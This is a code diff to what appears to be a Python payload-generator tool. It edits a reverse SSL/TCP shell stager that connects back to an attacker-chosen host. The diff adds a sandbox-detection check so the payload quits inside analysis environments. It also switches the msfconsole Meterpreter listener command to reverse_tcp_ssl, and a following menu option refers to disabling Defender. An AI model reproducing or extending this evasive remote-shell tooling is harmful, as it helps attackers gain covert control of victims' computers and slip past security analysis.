@@ -360,7 +360,13 @@ def gen_rev_ssl_tcp():
         ina.write("\n")
         ina.write('hototo = "'+str(host)+'"')
         b = '''
+from sandboxed import is_sandboxed
 import zlib,base64,ssl,socket,struct,time
+import sys
+
+certainty = is_sandboxed(logging=False)
+if int(certainty*100) > 50:
+    sys.exit(1)
 for x in range(10):
 	try:
 		so=socket.socket(2,1)
@@ -697,11 +703,11 @@ if nscan == "4":
         print('After that the listener will spawn instantly')
         server()
         print('wait...')
-        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
         os.system(a)
     else:
         print('wait...')
-        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
         os.system(a)
 if nscan == '5':
     disable_defender = False
